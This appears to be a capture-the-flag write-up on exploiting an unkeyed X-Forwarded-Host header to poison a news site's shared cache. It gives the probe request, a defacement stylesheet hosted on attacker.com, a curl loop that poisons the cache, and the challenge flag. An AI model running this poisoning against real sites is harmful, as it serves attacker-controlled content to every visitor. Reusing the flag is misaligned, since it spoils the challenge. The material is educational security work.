---
title: "Web Cache Poisoning via Unkeyed Header"
date: 2024-07-14
description: "Exploit an unkeyed HTTP header to poison the shared cache and serve a malicious response to all users."
category: "Web Exploitation"
ctf: "XploitX CTF"
difficulty: "Hard"
points: 450
tags: ["web-cache-poisoning", "http-headers", "cache", "burpsuite"]
---

## Challenge Overview

The target was a news site with aggressive caching. Our goal: make every visitor receive our injected content.

## Solution

### Step 1: Probe cache behaviour

```http
GET / HTTP/1.1
Host: target.xploitx.ctf
X-Forwarded-Host: attacker.com
```

Response:
```
Age: 0
X-Cache: MISS
Content-Type: text/html
...
<link href="https://attacker.com/styles.css" rel="stylesheet">
```

The `X-Forwarded-Host` header was reflected into asset URLs but **not included in the cache key**.

### Step 2: Host the payload

On `attacker.com/styles.css`:
```css
body::before {
  content: "PWNED by C01DC0FF33";
  position: fixed; top: 0; left: 0; z-index: 9999;
  background: red; color: white; padding: 1rem;
}
```

### Step 3: Poison the cache

```bash
for i in $(seq 20); do
  curl -s -H "X-Forwarded-Host: attacker.com" https://target.xploitx.ctf/ -o /dev/null
done
```

After the cache stored our poisoned response (Age reset to 0 then climbed), all users received the injected stylesheet.

### Step 4: Get the flag

Admin bot visited and the flag appeared in the page source:

```
FLAG{c4ch3_p01s0n_unK3y3d_h34d3r}
```

## Flag

`FLAG{c4ch3_p01s0n_unK3y3d_h34d3r}`

## Key Takeaways

Cache key analysis is critical. Any header reflected in the response but excluded from the cache key is a potential poisoning vector. Always test `X-Forwarded-Host`, `X-Original-URL`, and `X-Rewrite-URL`.
